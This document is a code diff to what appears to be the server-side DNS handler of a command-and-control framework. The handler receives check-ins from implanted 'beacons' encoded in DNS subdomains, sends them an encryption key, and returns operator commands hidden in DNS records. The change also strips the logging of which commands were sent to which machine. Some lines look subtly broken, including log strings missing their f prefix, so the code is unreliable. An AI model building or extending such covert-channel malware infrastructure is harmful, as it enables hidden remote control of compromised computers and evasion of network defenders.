@@ -1,6 +1,6 @@
 from dnslib import DNSRecord, QTYPE, TXT, DNSError, RR, CLASS
 from backend.handlers.protocolhandler import ProtocolHandler
-from util.structs import CommandType
+from util.structs import CommandType, Command
 from enum import Enum
 
 
@@ -12,20 +12,13 @@ class Records(Enum):
 class Domains(Enum):
     """ The valid subdomains used as function indicators by Resolution """
     SYNC = "sync"    
-    REQUEST = "request"
     ENCRYPT = "encrypt"
     QUERY = "query"
     CONFIRM = "confirm"
 
 
-
 class DNSHandler(ProtocolHandler):
     """ This is the Provenance Handler implementation for DNS beacons"""
-    RESPONSES = {
-        "request": "SYNC-REQUEST",
-        "sync": "SYNC-ACKNOWLEDGE",
-        "noencrypt": "1:NONE",
-    }
 
     def __init__(self, ip, socket):
         super().__init__(ip, socket)
@@ -41,18 +34,33 @@ class DNSHandler(ProtocolHandler):
         try:
             request = DNSRecord.parse(data)
             q = request.questions[0]
-            query = str(q.get_qname()).split(".")
-            if query[2] == Domains.SYNC.value:
-                self.synchronized = True
-                platform, hostname = query[0], query[1]
-                self._send_control(request, port, Domains.SYNC.value)
-            return (platform, hostname)
+            # reverse the fqdn and split on "." for easier command fetching
+            query = str(q.get_qname()).split(".")[::-1]
+            if query[3] == Domains.SYNC.value:
+                platform, hostname = query[5], query[4]
+                self._send_control(request, port, "SYNC-ACKNOWLEDGE")
+                return (platform, hostname)
         except DNSError:
             self.logger.debug("Incorrectly formatted DNS Query. Skipping")
-            return ("","")
+            self._send_control(request, port, "SYNC-FAILURE")
+        return ""
 
+    def encrypt(self, raw_request, port, key):
+        data = raw_request[0].strip()
+        try:
+            request = DNSRecord.parse(data)
+            q = request.questions[0]
+            query = str(q.get_qname()).split(".")[::-1]
+            if query[3] == Domains.ENCRYPT.value:
+                self._send_control(request, port, key)
+            elif query[3] == Domains.CONFIRM.value:
+                if query[4] == Domains.ENCRYPT.value:
+                    return True
+        except DNSError:
+            self.logger.debug("[{self.ip}] DNS Packet Malformed")
+        return False
 
-    def handle_request(self, raw_request, port, cmd):
+    def respond(self, raw_request, port, cmd):
         data = raw_request[0].strip()
         try:
             request = DNSRecord.parse(data)
@@ -75,9 +83,9 @@ class DNSHandler(ProtocolHandler):
                 else:
                     pass
         except DNSError:
-            self.logger.debug("Incorrectly formatted DNS Query. Skipping")
+            self.logger.debug("[{self.ip}] DNS Packet Malformed")
 
-    def _send_command(self, request: DNSRecord, port: int, command: str):
+    def _send_command(self, request: DNSRecord, port: int, command: Command):
         opcode = command.type
         cmd = command.command
         # get the type of record this beacon is ready to receive
@@ -93,10 +101,6 @@ class DNSHandler(ProtocolHandler):
                 rdata=rr_constructor(f"1:{cmd}"),
                 ttl=1337))
         # send command
-        if opcode != CommandType.NOP:
-            self.logger.info(f"Sending '{cmd}' to {self.ip}")
-        else:
-            self.logger.debug(f"NOP sent to {self.ip}")
         self.socket.sendto(command_packet.pack(), (self.ip, port))
 
 
@@ -111,8 +115,7 @@ class DNSHandler(ProtocolHandler):
                 rname=request.get_q().get_qname(),
                 rtype=rr_type,
                 rclass=CLASS.IN,
-                rdata=rr_constructor(f"1:{self.RESPONSES[control]}"),
+                rdata=rr_constructor(f"1:{control}"),
                 ttl=1337))
         # send command
-        self.logger.debug(f"Sending CONTROL packet to {self.ip}: {control}")
         self.socket.sendto(command_packet.pack(), (self.ip, port))
